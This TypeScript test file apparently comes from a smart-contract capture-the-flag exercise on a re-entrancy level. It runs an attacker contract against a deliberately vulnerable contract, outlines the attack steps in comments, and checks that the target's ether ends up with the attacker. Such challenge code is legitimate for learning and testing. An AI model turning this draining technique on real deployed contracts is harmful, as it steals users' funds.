import { expect } from "chai";
import { Contract, utils } from "ethers";
import { ethers } from "hardhat";
import { REENTRANCY_LEVEL_ADDRESS } from "./constants";
import { TestOptions, setupChallenge, submitLevel } from "./utils";

const { parseEther } = utils;

describe("Re-entrancy", () => {
  let challenge: Contract;
  let attacker: Contract | undefined;

  before(async () => {
    const contractLevel = REENTRANCY_LEVEL_ADDRESS;
    const options: TestOptions = {
      contractName: "ReEntrancy",
      attackerName: "ReEntrancyAttacker",
      value: parseEther("1"),
    };
    ({ challenge, attacker } = await setupChallenge(contractLevel, options));
  });

  it("solves the challenge", async () => {
    const donateAmount = parseEther("1");
    const beforeContractBalance = await ethers.provider.getBalance(
      challenge.address
    );
    expect(beforeContractBalance.toNumber()).to.be.greaterThan(0);

    // 1. the attacker first donates to the vulnerable contract
    // 2. executes withdraw
    // 3. the receive function executes the re-entrancy attack (withdraws again before its balance is updated)
    await attacker?.attack({ value: donateAmount });

    const afterBalance = await ethers.provider.getBalance(challenge.address);
    expect(afterBalance.toNumber()).to.be.equal(0);

    const afterAttackerBalance = await ethers.provider.getBalance(
      attacker!.address
    );
    expect(afterAttackerBalance).to.be.equal(
      donateAmount.add(beforeContractBalance)
    );
  });

  after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true;
  });
});
